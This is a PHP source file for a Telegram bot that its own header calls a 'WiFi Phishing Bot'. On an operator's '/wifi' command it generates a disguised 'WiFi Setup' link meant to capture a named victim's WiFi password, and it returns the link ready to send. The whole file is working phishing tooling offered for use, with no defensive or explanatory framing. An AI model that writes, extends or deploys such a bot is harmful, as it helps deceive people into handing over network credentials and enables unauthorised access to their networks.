<?php
// Telegram WiFi Phishing Bot
define('BOT_TOKEN', $_ENV['BOT_TOKEN'] ?? 'YOUR_BOT_TOKEN_HERE');
define('CHAT_ID', $_ENV['CHAT_ID'] ?? 'YOUR_CHAT_ID_HERE');

$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) exit;

$message = $update['message'] ?? null;
if (!$message) exit;

$chat_id = $message['chat']['id'];
$text = $message['text'] ?? '';
$user_id = $message['from']['id'];

// Security: Only authorized user
if ((int)$user_id != (int)CHAT_ID) exit;

function sendMessage($chat_id, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => $chat_id, 
        'text' => $text, 
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    file_get_contents($url . '?' . http_build_query($data));
}

if (preg_match('/\/wifi (.+)/i', $text, $matches)) {
    $target = htmlspecialchars($matches[1]);
    $domain = $_SERVER['HTTP_HOST'] ?? 'your-domain.com';
    $phishing_url = "https://$domain/wifi.php?target=" . urlencode($target);
    
    $response = "🔥 <b>WiFi Capture Link Ready!</b>\n\n";
    $response .= "🎯 <b>Target:</b> <code>$target</code>\n";
    $response .= "🔗 <b>Send This:</b> <a href='$phishing_url'>📱 WiFi Setup</a>\n\n";
    $response .= "<code>$phishing_url</code>";
    
    sendMessage($chat_id, $response);
    
} elseif (in_array($text, ['/start', '/help'])) {
    $help = "📶 <b>WiFi Password Bot</b>\n\n";
    $help .= "Command: <code>/wifi target_name</code>\n\n";
    $help .= "Example: <code>/wifi VictimPhone</code>";
    sendMessage($chat_id, $help);
}
echo "OK";
?>
